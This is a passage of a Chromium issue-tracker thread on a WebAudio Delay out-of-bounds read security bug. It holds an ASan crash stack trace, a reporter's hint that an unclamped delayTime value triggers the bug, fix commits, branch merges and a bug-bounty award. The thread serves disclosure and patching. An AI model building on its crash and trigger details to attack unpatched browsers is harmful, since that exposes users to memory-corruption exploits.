iopl=0         nv up ei pl zr na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010244
chrome!blink::Delay::ProcessARateVector+0x300:
00007ffe`01c923a0 f3440f100a      movss   xmm9,dword ptr [rdx] ds:00001357`cf3f7650=????????
0:015> k
 # Child-SP          RetAddr               Call Site
00 000000d8`817fdcf0 00007ffe`014f9bb7     chrome!blink::Delay::ProcessARateVector+0x300 [third_party\blink\renderer\platform\audio\cpu\x86\delay_sse2.cc @ 115] 
01 000000d8`817fde00 00007ffe`0031cdaf     chrome!blink::Delay::ProcessARate+0x267 [third_party\blink\renderer\platform\audio\delay.cc @ 197] 
02 000000d8`817fdee0 00007ffd`fde08b41     chrome!blink::DelayHandler::Process+0x6c3 [third_party\blink\renderer\modules\webaudio\delay_handler.cc @ 73] 
03 000000d8`817fdfe0 00007ffd`fde117f0     chrome!blink::AudioHandler::ProcessIfNecessary+0x3cd [third_party\blink\renderer\modules\webaudio\audio_handler.cc @ 347] 
04 000000d8`817fe0b0 00007ffe`001aa23d     chrome!blink::AudioNodeOutput::Pull+0x11e [third_party\blink\renderer\modules\webaudio\audio_node_output.cc @ 135] 
05 000000d8`817fe100 00007ffe`001aa595     chrome!blink::AudioNodeInput::SumAllConnections+0x179 [third_party\blink\renderer\modules\webaudio\audio_node_input.cc @ 132] 
06 000000d8`817fe1c0 00007ffd`fdf9efa2     chrome!blink::AudioNodeInput::Pull+0x1fb [third_party\blink\renderer\modules\webaudio\audio_node_input.cc @ 162] 
07 000000d8`817fe280 00007ffe`0028596d     chrome!blink::RealtimeAudioDestinationHandler::Render+0x2ca [third_party\blink\renderer\modules\webaudio\realtime_audio_destination_handler.cc @ 222] 
08 000000d8`817fe370 00007ffe`00287669     chrome!blink::AudioDestination::ProvideResamplerInput+0x1ed [third_party\blink\renderer\platform\audio\audio_destination.cc @ 546] 
09 (Inline Function) --------`--------     chrome!base::internal::FunctorTraits<void (blink::AudioDestination::*)(int, blink::AudioBus *)>::Invoke+0x11 [base\functional\bind_internal.h @ 714] 
0a (Inline Function) --------`--------     chrome!base::internal::InvokeHelper<0,void,0>::MakeItSo+0x3e [base\functional\bind_internal.h @ 869] 
0b (Inline Function) --------`--------     chrome!base::internal::Invoker<base::internal::BindState<void (blink::AudioDestination::*)(int, blink::AudioBus *),WTF::CrossThreadUnretainedWrapper<blink::AudioDestination> >,void (int, blink::AudioBus *)>::RunImpl+0x5f [base\functional\bind_internal.h @ 969] 
0c 000000d8`817fe440 00007ffe`014a7231     chrome!base::internal::Invoker<base::internal::BindState<void (blink::AudioDestination::*)(int, blink::AudioBus *),WTF::CrossThreadUnretainedWrapper<blink::AudioDestination> >,void (int, blink::AudioBus *)>::Run+0x129 [base\functional\bind_internal.h @ 933] 
0d 000000d8`817fe4e0 00007ffe`014a66dd     chrome!base::RepeatingCallback<void (int, blink::AudioBus *)>::Run+0x191 [base\functional\callback.h @ 348] 
0e (Inline Function) --------`--------     chrome!WTF::CrossThreadFunction<void (int, blink::AudioBus *)>::Run+0xc [third_party\blink\renderer\platform\wtf\functional.h @ 304] 
0f 000000d8`817fe5a0 00007ffe`014a6fcc     chrome!blink::MediaMultiChannelResampler::ProvideResamplerInput+0x2ad [third_party\blink\renderer\platform\audio\media_multi_channel_resampler.cc @ 59] 
10 (Inline Function) --------`--------     chrome!base::internal::FunctorTraits<void (blink::MediaMultiChannelResampler::*)(int, media::AudioBus *)>::Invoke+0x11 [base\functional\bind_internal.h @ 714] 
11 (Inline Function) --------`--------     chrome!base::internal::InvokeHelper<0,void,0>::MakeItSo+0x6d [base\functional\bind_internal.h @ 869] 
12 (Inline Function) --------`--------     chrome!base::internal::Invoker<base::internal::BindState<void (blink::MediaMultiChannelResampler::*)(int, media::AudioBus *),base::internal::UnretainedWrapper<blink::MediaMultiChannelResampler,base::unretained_traits::MayNotDangle,0> >,void (int, media::AudioBus *)>::RunImpl+0x14f [base\functional\bind_internal.h @ 969] 
13 000000d8`817fe680 00007ffd`dea2a15d     chrome!base::internal::Invoker<base::internal::BindState<void (blink::MediaMultiChannelResampler::*)(int, media::AudioBus *),base::internal::UnretainedWrapper<blink::MediaMultiChannelResampler,base::unretained_traits::MayNotDangle,0> >,void (int, media::AudioBus *)>::Run+0x1cc [base\functional\bind_internal.h @ 933] 
14 000000d8`817fe740 00007ffd`dea9263b     chrome!base::RepeatingCallback<void (int, media::AudioBus *)>::Run+0x191 [base\functional\callback.h @ 348] 
15 (Inline Function) --------`--------     chrome!base::internal::FunctorTraits<void (media::MultiChannelResampler::*)(int, int, float *)>::Invoke+0x4f [base\functional\bind_internal.h @ 714] 
16 (Inline Function) --------`--------     chrome!base::internal::InvokeHelper<0,void,0,1>::MakeItSo+0xae [base\functional\bind_internal.h @ 869] 
17 (Inline Function) --------`--------     chrome!base::internal::Invoker<base::internal::BindState<void (media::MultiChannelResampler::*)(int, int, float *),base::internal::UnretainedWrapper<media::MultiChannelResampler,base::unretained_traits::MayNotDangle,0>,int>,void (int, float *)>::RunImpl+0x101 [base\functional\bind_internal.h @ 969] 
18 000000d8`817fe800 00007ffd`deac8a23     chrome!base::internal::Invoker<base::internal::BindState<void (media::MultiChannelResampler::*)(int, int, float *),base::internal::UnretainedWrapper<media::MultiChannelResampler,base::unretained_traits::MayNotDangle,0>,int>,void (int, float *)>::Run+0x223 [base\functional\bind_internal.h @ 933] 
19 000000d8`817fe8e0 00007ffd`deac83fa     chrome!base::RepeatingCallback<void (int, float *)>::Run+0x191 [base\functional\callback.h @ 348] 
1a 000000d8`817fe9a0 00007ffd`dea918e1     chrome!media::SincResampler::Resample+0x9de [media\base\sinc_resampler.cc @ 343] 
1b 000000d8`817feb70 00007ffe`00281f2c     chrome!media::MultiChannelResampler::Resample+0x1f5 [media\base\multi_channel_resampler.cc @ 77] 
1c 000000d8`817fec00 00007ffe`002806d3     chrome!blink::AudioDestination::RequestRender+0x7cc [third_party\blink\renderer\platform\audio\audio_destination.cc @ 529] 
1d 000000d8`817fedd0 00007ffd`fc350c8e     chrome!blink::AudioDestination::Render+0x13a3 [third_party\blink\renderer\platform\audio\audio_destination.cc @ 202] 
1e 000000d8`817fef10 00007ffd`de9baccf     chrome!content::RendererWebAudioDeviceImpl::Render+0x234 [content\renderer\media\renderer_webaudiodevice_impl.cc @ 287] 
1f 000000d8`817fefe0 00007ffd`de9bb59d     chrome!media::NullAudioSink::CallRender+0xc1 [media\audio\null_audio_sink.cc @ 119] 
20 (Inline Function) --------`--------     chrome!base::internal::FunctorTraits<void (media::NullAudioSink::*)(base::TimeTicks, base::TimeTicks)>::Invoke+0x41 [base\functional\bind_internal.h @ 714] 
21 (Inline Function) --------`--------     chrome!base::internal::InvokeHelper<0,void,0>::MakeItSo+0x9e [base\functional\bind_internal.h @ 869] 
22 (Inline Function) --------`--------     chrome!base::internal::Invoker<base::internal::BindState<void (media::NullAudioSink::*)(base::TimeTicks, base::TimeTicks),base::internal::UnretainedWrapper<media::NullAudioSink,base::unretained_traits::MayNotDangle,0> >,void (base::TimeTicks, base::TimeTicks)>::RunImpl+0xd1 [base\functional\bind_internal.h @ 969] 
23 000000d8`817ff040 00007ffd`dea69ad0     chrome!base::internal::Invoker<base::internal::BindState<void (media::NullAudioSink::*)(base::TimeTicks, base::TimeTicks),base::internal::UnretainedWrapper<media::NullAudioSink,base::unretained_traits::MayNotDangle,0> >,void (base::TimeTicks, base::TimeTicks)>::Run+0x19b [base\functional\bind_internal.h @ 933] 
24 000000d8`817ff0e0 00007ffd`dea68c11     chrome!base::RepeatingCallback<void (base::TimeTicks, base::TimeTicks)>::Run+0x1d8 [base\functional\callback.h @ 348] 
25 000000d8`817ff1a0 00007ffd`dea69dc7     chrome!media::FakeAudioWorker::Worker::DoRead+0x435 [media\base\fake_audio_worker.cc @ 177] 
26 (Inline Function) --------`--------     chrome!base::internal::FunctorTraits<void (media::FakeAudioWorker::Worker::*)()>::Invoke+0x1c [base\functional\bind_internal.h @ 714] 
27 (Inline Function) --------`--------     chrome!base::internal::InvokeHelper<0,void,0>::MakeItSo+0x32 [base\functional\bind_internal.h @ 869] 
28 (Inline Function) --------`--------     chrome!base::internal::Invoker<base::internal::BindState<void (media::FakeAudioWorker::Worker::*)(),scoped_refptr<media::FakeAudioWorker::Worker> >,void ()>::RunImpl+0x53 [base\functional\bind_internal.h @ 969] 
29 000000d8`817ff2a0 00007ffd`dcb8e182     chrome!base::internal::Invoker<base::internal::BindState<void (media::FakeAudioWorker::Worker::*)(),scoped_refptr<media::FakeAudioWorker::Worker> >,void ()>::Run+0x117 [base\functional\bind_internal.h @ 920] 
2a 000000d8`817ff340 00007ffd`dccd7a30     chrome!base::RepeatingCallback<void ()>::Run+0x184 [base\functional\callback.h @ 348] 
2b (Inline Function) --------`--------     chrome!base::internal::FunctorTraits<void (base::internal::CancelableCallbackImpl<base::OnceCallback<void ()> >::*)()>::Invoke+0x12 [base\functional\bind_internal.h @ 714] 
2c (Inline Function) --------`--------     chrome!base::internal::InvokeHelper<1,void,0>::MakeItSo+0x5d [base\functional\bind_internal.h @ 897] 
2d (Inline Function) --------`--------     chrome!base::internal::Invoker<base::internal::BindState<void (base::internal::CancelableCallbackImpl<base::OnceCallback<void ()> >::*)(),base::WeakPtr<base::internal::CancelableCallbackImpl<base::OnceCallback<void ()> > > >,void ()>::RunImpl+0x7b [base\functional\bind_internal.h @ 969] 
2e 000000d8`817ff3e0 00007ffd`eb73b632     chrome!base::internal::Invoker<base::internal::BindState<void (base::internal::CancelableCallbackImpl<base::OnceCallback<void ()> >::*)(),base::WeakPtr<base::internal::CancelableCallbackImpl<base::OnceCallback<void ()> > > >,void ()>::RunOnce+0x13e [base\functional\bind_internal.h @ 933] 
2f (Inline Function) --------`--------     chrome!base::OnceCallback<void ()>::Run+0xa4 [base\functional\callback.h @ 156] 
30 000000d8`817ff480 00007ffd`f35fde4e     chrome!base::TaskAnnotator::RunTaskImpl+0x472 [base\task\common\task_annotator.cc @ 201] 
31 (Inline Function) --------`--------     chrome!base::TaskAnnotator::RunTask+0x143 [base\task\common\task_annotator.h @ 89] 
32 000000d8`817ff720 00007ffd`f35fe17a     chrome!base::internal::TaskTracker::RunTaskImpl+0x2de [base\task\thread_pool\task_tracker.cc @ 649] 
33 000000d8`817ff7d0 00007ffd`f35fd079     chrome!base::internal::TaskTracker::RunSkipOnShutdown+0x10a [base\task\thread_pool\task_tracker.cc @ 634] 
34 (Inline Function) --------`--------     chrome!base::internal::TaskTracker::RunTaskWithShutdownBehavior+0x6c [base\task\thread_pool\task_tracker.cc @ 664] 
35 000000d8`817ff890 00007ffd`f35fc0b7     chrome!base::internal::TaskTracker::RunTask+0x6b9 [base\task\thread_pool\task_tracker.cc @ 491] 
36 000000d8`817ff9e0 00007ffd`f8c770a0     chrome!base::internal::TaskTracker::RunAndPopNextTask+0x747 [base\task\thread_pool\task_tracker.cc @ 406] 
37 000000d8`817ffae0 00007ffd`f8c75ed0     chrome!base::internal::WorkerThread::RunWorker+0xcd0 [base\task\thread_pool\worker_thread.cc @ 423] 
38 000000d8`817ffd00 00007ffd`eb644902     chrome!base::internal::WorkerThread::RunSharedWorker+0xc0 [base\task\thread_pool\worker_thread.cc @ 318] 
*** WARNING: Unable to verify checksum for out\1231040-asan-x64\chrome.exe
39 000000d8`817ffda0 00007ff7`286c353a     chrome!base::`anonymous namespace'::ThreadFunc+0x2e2 [base\threading\platform_thread_win.cc @ 140] 
3a 000000d8`817ffe60 00007ffe`b7f27344     chrome_exe!asan_thread_start+0x3a [C:\b\s\w\ir\cache\builder\src\third_party\llvm\compiler-rt\lib\asan\asan_win.cpp @ 147] 
3b 000000d8`817ffeb0 00007ffe`b95c26b1     KERNEL32!BaseThreadInitThunk+0x14
3c 000000d8`817ffee0 00000000`00000000     ntdll!RtlUserThreadStart+0x21




### su...@gmail.com (2023-12-07)

When executing the code delay.delayTime.value = 100, a warning message appears in the devtools:
```
Delay.delayTime.value 100 outside nominal range [0, 1]; value will be clamped.
Delay.delayTime.setValueAtTime value 100 outside nominal range [0, 1]; value will be clamped.
```
However, it seems like delay.delayTime.value is not correctly clamped, is that correct?


### ho...@chromium.org (2023-12-07)

Re: c#42

I blindly believed that clamping is already being done correctly, but it was not the case. Uploaded a new change and it seems to be valid for both negative/positive delay time: https://chromium-review.googlesource.com/c/chromium/src/+/5100625

I'll get it reviewed once it passes all the WPTs.

### gi...@appspot.gserviceaccount.com (2023-12-08)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/c97b506c1e32951dd39e11e453e1ecc29cc0b35c

commit c97b506c1e32951dd39e11e453e1ecc29cc0b35c
Author: Hongchan Choi <hongchan@chromium.org>
Date: Fri Dec 08 15:34:25 2023

Clamp the input value correctly before scheduling an AudioParam event

When the AudioParam value is set via the setter, it internally calls
the setValueAtTime() function to schedule the change. However, the
current code does not correctly clamp the value within the nominal
range. This CL fixes the problem.

Bug: 1505086
Test: Locally confirmed with both negative and positive param values.
Change-Id: Ibb0aae168161af9ea95c5e11a929b3aa2c621c73
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5100625
Reviewed-by: Michael Wilson <mjwilson@chromium.org>
Commit-Queue: Hongchan Choi <hongchan@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1235028}

[modify] https://crrev.com/c97b506c1e32951dd39e11e453e1ecc29cc0b35c/third_party/blink/renderer/modules/webaudio/audio_param.cc
[modify] https://crrev.com/c97b506c1e32951dd39e11e453e1ecc29cc0b35c/third_party/blink/web_tests/webaudio/AudioParam/worklet-warnings-expected.txt


### ho...@chromium.org (2023-12-08)

The out-of-bound problem around the AudioParam should be fixed with c#43.

sunburst.chromium@ Feel free to test/verify.

### [Deleted User] (2023-12-09)

[Empty comment from Monorail migration]

### [Deleted User] (2023-12-09)

[Empty comment from Monorail migration]

### [Deleted User] (2023-12-09)

Requesting merge to stable M120 because latest trunk commit (1235028) appears to be after stable branch point (1217362).

Requesting merge to beta M121 because latest trunk commit (1235028) appears to be after beta branch point (1233107).

Merge review required: M120 is already shipping to stable.

Merge review required: M121 is already shipping to beta.

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Sheriffbot has determined this fix is necessary on milestone(s): [120, 121].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been tested on Canary?
3. Has this fix been verified to not pose any stability regressions and does it pose potential stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-12-10)

Requesting merge to stable M120 because latest trunk commit (1235028) appears to be after stable branch point (1217362).

Requesting merge to beta M121 because latest trunk commit (1235028) appears to be after beta branch point (1233107).

Merge review required: M120 is already shipping to stable.

Merge review required: M121 is already shipping to beta.

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Sheriffbot has determined this fix is necessary on milestone(s): [120, 121].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been tested on Canary?
3. Has this fix been verified to not pose any stability regressions and does it pose potential stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### su...@gmail.com (2023-12-11)

Re: https://crbug.com/chromium/1505086#c42 

I tested the new fix locally, and there were no more crashes.

### ho...@chromium.org (2023-12-11)

Thank you for verification! sunburst.chromium@

### [Deleted User] (2023-12-11)

Requesting merge to stable M120 because latest trunk commit (1235028) appears to be after stable branch point (1217362).

Requesting merge to beta M121 because latest trunk commit (1235028) appears to be after beta branch point (1233107).

Merge review required: M120 is already shipping to stable.

Merge review required: M121 is already shipping to beta.

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Sheriffbot has determined this fix is necessary on milestone(s): [120, 121].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been tested on Canary?
3. Has this fix been verified to not pose any stability regressions and does it pose potential stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ho...@chromium.org (2023-12-11)

Re c#51:

1. https://crrev.com/c/5072113 and https://crrev.com/c/5072113
2. Yes. (See c#49)
3. It clamps the range of the value without any potential regression, so I'd say yes.
4. No.
5. Yes. CF couldn't reproduce the issue, so myself and the reporter did the manual verificaiton.

### am...@chromium.org (2023-12-11)

I presume #1 above is supposed to be https://crrev.com/c/5072113 and https://crrev.com/c/5100625

https://crrev.com/c/5072113 was already landed on 121, so M121 merge not needed for this fix; M120 merge approved, please merge this fix to branch 6099 so it can be included in the first Stable channel update following the forthcoming release freeze 

M121 and M120 merges approved for https://crrev.com/c/5100625; please merge this fix to branch 6167 ASAP (by EOD Tuesday 12 December) so this fix can be included in the next M121 Beta (shipping Wednesday). 
Pease merge to M120 / branch 6099 at your convenience so this fix can be included in the first Stable release following the forthcoming release freeze. 


### ho...@chromium.org (2023-12-12)

Sorry amressler@, somehow my copy/pasting was broken. You're correct on two different CLs.

https://crrev.com/c/5072113
- https://crrev.com/c/5112992 (M120 merge, 6099)

https://crrev.com/c/5100625
- https://crrev.com/c/5113410 (M121 merge, 6167)
- https://crrev.com/c/5112838 (M120 merge, 6099)

They all are being landed at the moment. I'll monitor the progress.

### gi...@appspot.gserviceaccount.com (2023-12-12)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/3881046ebb92debeff8b701f0a9e60ab71d45474

commit 3881046ebb92debeff8b701f0a9e60ab71d45474
Author: Hongchan Choi <hongchan@chromium.org>
Date: Tue Dec 12 01:39:02 2023

Clamp the input value correctly before scheduling an AudioParam event

When the AudioParam value is set via the setter, it internally calls
the setValueAtTime() function to schedule the change. However, the
current code does not correctly clamp the value within the nominal
range. This CL fixes the problem.

(cherry picked from commit c97b506c1e32951dd39e11e453e1ecc29cc0b35c)

Bug: 1505086
Test: Locally confirmed with both negative and positive param values.
Change-Id: Ibb0aae168161af9ea95c5e11a929b3aa2c621c73
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5100625
Reviewed-by: Michael Wilson <mjwilson@chromium.org>
Commit-Queue: Hongchan Choi <hongchan@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1235028}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5113410
Auto-Submit: Hongchan Choi <hongchan@chromium.org>
Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Commit-Queue: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Cr-Commit-Position: refs/branch-heads/6167@{#251}
Cr-Branched-From: 222e786949e76e342d325ea0d008b4b6273f3a89-refs/heads/main@{#1233107}

[modify] https://crrev.com/3881046ebb92debeff8b701f0a9e60ab71d45474/third_party/blink/renderer/modules/webaudio/audio_param.cc
[modify] https://crrev.com/3881046ebb92debeff8b701f0a9e60ab71d45474/third_party/blink/web_tests/webaudio/AudioParam/worklet-warnings-expected.txt


### gi...@appspot.gserviceaccount.com (2023-12-12)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/5b2fddadaa12e4f4aa8166de13446db5e339c4fa

commit 5b2fddadaa12e4f4aa8166de13446db5e339c4fa
Author: Hongchan Choi <hongchan@chromium.org>
Date: Tue Dec 12 02:34:29 2023

Clamp the input value correctly before scheduling an AudioParam event

When the AudioParam value is set via the setter, it internally calls
the setValueAtTime() function to schedule the change. However, the
current code does not correctly clamp the value within the nominal
range. This CL fixes the problem.

(cherry picked from commit c97b506c1e32951dd39e11e453e1ecc29cc0b35c)

Bug: 1505086
Test: Locally confirmed with both negative and positive param values.
Change-Id: Ibb0aae168161af9ea95c5e11a929b3aa2c621c73
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5100625
Reviewed-by: Michael Wilson <mjwilson@chromium.org>
Commit-Queue: Hongchan Choi <hongchan@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1235028}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5112838
Commit-Queue: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Auto-Submit: Hongchan Choi <hongchan@chromium.org>
Cr-Commit-Position: refs/branch-heads/6099@{#1497}
Cr-Branched-From: e6ee4500f7d6549a9ac1354f8d056da49ef406be-refs/heads/main@{#1217362}

[modify] https://crrev.com/5b2fddadaa12e4f4aa8166de13446db5e339c4fa/third_party/blink/renderer/modules/webaudio/audio_param.cc
[modify] https://crrev.com/5b2fddadaa12e4f4aa8166de13446db5e339c4fa/third_party/blink/web_tests/webaudio/AudioParam/worklet-warnings-expected.txt


### gi...@appspot.gserviceaccount.com (2023-12-12)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/1a8e198de5afc3914f85d4de8195a92008114ff5

commit 1a8e198de5afc3914f85d4de8195a92008114ff5
Author: Hongchan Choi <hongchan@chromium.org>
Date: Tue Dec 12 02:36:08 2023

Wrap buffer read index in delay kernel

The current code assumes that the first buffer read index in the delay
kernel does not go out of bound. This CL applies the wrapping function
to the read index array.

(cherry picked from commit fb96fd5f41bec823dbb208d9a7d53fbbf4d16ce4)

Bug: 1505086
Test: Locally confirmed the repro does not crash anymore
Change-Id: Idca3dfc7dec5b5a7f9b22d87135e2d775729631a
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5072113
Commit-Queue: Hongchan Choi <hongchan@chromium.org>
Reviewed-by: Michael Wilson <mjwilson@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1231040}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5112992
Auto-Submit: Hongchan Choi <hongchan@chromium.org>
Commit-Queue: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Cr-Commit-Position: refs/branch-heads/6099@{#1498}
Cr-Branched-From: e6ee4500f7d6549a9ac1354f8d056da49ef406be-refs/heads/main@{#1217362}

[modify] https://crrev.com/1a8e198de5afc3914f85d4de8195a92008114ff5/third_party/blink/renderer/platform/audio/delay.cc
[modify] https://crrev.com/1a8e198de5afc3914f85d4de8195a92008114ff5/third_party/blink/renderer/platform/audio/cpu/arm/delay_neon.cc
[modify] https://crrev.com/1a8e198de5afc3914f85d4de8195a92008114ff5/third_party/blink/renderer/platform/audio/cpu/x86/delay_sse2.cc


### am...@google.com (2023-12-14)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2023-12-14)

Congratulations Huang Xilin! The Chrome VRP Panel has decided to award you $10,000 for this report. We specifically appreciate your efforts in c#41 and forward in identifying an issue with the original fix and testing the follow-up one. Thank you for your efforts here as well as in discovering and reporting this issue to us -- excellent work! 

### am...@google.com (2023-12-15)

[Empty comment from Monorail migration]

### am...@chromium.org (2024-01-03)

[Empty comment from Monorail migration]

### pg...@google.com (2024-01-04)

[Empty comment from Monorail migration]

### pg...@google.com (2024-01-04)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1505086?no_tracker_redirect=1

[Multiple monorail components: Blink>Media>Audio, Blink>WebAudio]
[Monorail components added to Component Tags custom field.]

### pe...@google.com (2024-03-16)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40945677)*
